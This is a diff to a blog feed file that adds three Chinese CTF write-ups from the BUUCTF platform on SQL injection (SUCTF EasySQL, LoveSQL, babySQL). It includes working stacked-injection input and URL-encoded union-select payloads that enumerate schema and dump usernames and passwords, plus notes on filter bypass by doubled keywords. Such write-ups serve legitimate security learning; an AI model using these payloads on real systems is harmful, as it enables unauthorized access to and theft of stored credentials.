@@ -4,6 +4,69 @@
   
     
     <entry>
+      <title>【SUCTF 2019】 *EasySQL*</title>
+      <link href="/2021/07/11/buuctf%20%E3%80%90SUCTF%202019%E3%80%91%20EasySQL/"/>
+      <url>/2021/07/11/buuctf%20%E3%80%90SUCTF%202019%E3%80%91%20EasySQL/</url>
+      
+        <content type="html"><![CDATA[<p>上图~~~</p><img src="/buuctf/EasySQL5.PNG" class="lazyload" data-srcset="/buuctf/EasySQL5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><p><img src="C:\Users\hacke\Desktop\buuctf\EasySQL6.PNG" class="lazyload" data-srcset="C:\Users\hacke\Desktop\buuctf\EasySQL6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p>这界面真是短小精炼，经过一番很正经的乱七八糟的操作，显然，在我即将刷完且没有刷完的sqli-labs的程度下，这道题对我来说是没有任何悬念的。操作之后发现只有输入非零数字回显“1”，输入其他字符得不到回显。这下是完了，我的盲区。</p><img src="https://pic1.zhimg.com/80/v2-3bb698189680b58319be613bbc84b086_720w.jpg?source=1940ef5c" class="lazyload" data-srcset="https://pic1.zhimg.com/80/v2-3bb698189680b58319be613bbc84b086_720w.jpg?source=1940ef5c" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="勇敢牛牛，不怕困难！" style="zoom:60%"><p>经过大佬推断，这里的内部查询语句可能有一个判断。我是这样理解：</p><p>select输入的数据 <strong>||</strong> 内置的一个列名 from 表名。</p><p>查看网页源码，发现为select POST 进去的数据 <strong>||</strong> flag from Flag</p><p>(这里的表明是含有数据的表明)并发现其注入方式为<strong>堆叠注入</strong>。并且这里的**||<strong>为</strong>or**的作用。</p><p>内置的sql语句为：<code>sql=&quot;select&quot;.post[&#39;query&#39;].&quot;||flag from Flag&quot;</code>;</p><p>如果$post[‘query’]的数据为<code>*</code>,1, sql语句就变成了<code>select *,1||flag from Flag</code>,也就是<code>slect * ,1 from Flag</code>,也就是直接查询出了Flag表中的所有数据。</p><p>输入方式：<code>*,1</code></p><p><img src="/buuctf/EasySQL7.PNG" class="lazyload" data-srcset="/buuctf/EasySQL7.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="></p><p><strong>目前只能理解第一种方法</strong></p><p>【扩展】<font color="red"><a href="https://www.cnblogs.com/backlion/p/9721687.html">堆叠注入</a></font></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> buuctf-web </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【极客大挑战 2019】LoveSQL</title>
+      <link href="/2021/07/11/buuctf%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91LoveSQL/"/>
+      <url>/2021/07/11/buuctf%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91LoveSQL/</url>
+      
+        <content type="html"><![CDATA[<p>上图~~~</p><img src="/buuctf/LoveSQL1.PNG" class="lazyload" data-srcset="/buuctf/LoveSQL1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><img src="/buuctf/LoveSQL2.PNG" class="lazyload" data-srcset="/buuctf/LoveSQL2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><p>哇，该死的我看到tip就知道该怎么做了。不罗嗦，直接查数据库。上图先试了下二次注入，然后就是试不下去了，直接查吧！试了试发现其中有过滤机制。</p><p>先查库：<code>?username=admin&amp;password=ad&#39;%20union%20select%201,database(),2%23</code></p><img src="/buuctf/LoveSQL3.PNG" class="lazyload" data-srcset="/buuctf/LoveSQL3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="LoveSQL3" style="zoom:60%;" /><p>发现在<strong>geek</strong>库</p><p>接下来查表：<code>?username=admin&amp;password=ad&#39;%20union%20select%201,2,concat(table_name)%20from%20information_schema.tables%20where%20table_schema=&#39;geek&#39;%23</code></p><img src="/buuctf/LoveSQL4.PNG" class="lazyload" data-srcset="/buuctf/LoveSQL4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="LoveSQL4" style="zoom:60%;" /><p>推断flag在<strong>l0ve1ysq1</strong>里面</p><p>查字段：<code>?username=admin&amp;password=ad&#39;%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&#39;l0ve1ysq1&#39;%23</code></p><p>发现里面有<strong>id</strong>、<strong>username</strong>、<strong>password</strong></p><p>这里直接查字段的值：<code>?username=admin&amp;password=ad&#39;%20union%20select%201,2,group_concat(concat(0x7e,username,password))%20from%20geek.l0ve1ysq1%23</code></p><p><img src="/buuctf/LoveSQL5.PNG" class="lazyload" data-srcset="/buuctf/LoveSQL5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="LoveSQL5"></p><p>得到flag。</p><p><font color="red">注意：上述中where后面单引号里的内容在我的操作下化为了十六进制</font></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> buuctf-web </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>【极客大挑战 2019】babySQL</title>
+      <link href="/2021/07/11/buuctf%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91babySQL/"/>
+      <url>/2021/07/11/buuctf%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91babySQL/</url>
+      
+        <content type="html"><![CDATA[<p>上图~~~</p><img src="/buuctf/babySQL6.PNG" class="lazyload" data-srcset="/buuctf/babySQL6.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><img src="/buuctf/babySQL1.PNG" class="lazyload" data-srcset="/buuctf/babySQL1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:60%;" /><p>从tip可以看到对数据进行了过滤，真以为双写绕过就可以了？？我们就要进行各种绕过。</p><p>开始试了下二次注入，发现登陆成功，给了一串令人深思数字，结果发现屁都没有。</p><img src="/buuctf/babySQL2.PNG" class="lazyload" data-srcset="/buuctf/babySQL2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="babySQL2" style="zoom:60%;" /><p>可以推断这道题需要查数据库，刚开始各种尝试，各种绕过，各种错误。</p><p><img src="/buuctf/babySQL3.PNG" class="lazyload" data-srcset="/buuctf/babySQL3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="babySQL3"></p><p>可以看到，这里对空格、注释符和union等进行了过滤。需要双写过滤，并且对符号进行url编码。</p><img src="/buuctf/babySQL4.PNG" class="lazyload" data-srcset="/buuctf/babySQL4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="babySQL4" style="zoom:60%;" /><p>这里我对where后面的搜索值直接进行了十六位编码。</p><p><img src="/buuctf/babySQL5.PNG" class="lazyload" data-srcset="/buuctf/babySQL5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="babySQL5"></p><p>得到flag。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ctf </category>
+          
+          <category> buuctf-web </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>【极客大挑战 2019】 *EasySQL*</title>
       <link href="/2021/07/07/buuctf%20%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91%20EasySQL/"/>
       <url>/2021/07/07/buuctf%20%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%E3%80%91%20EasySQL/</url>
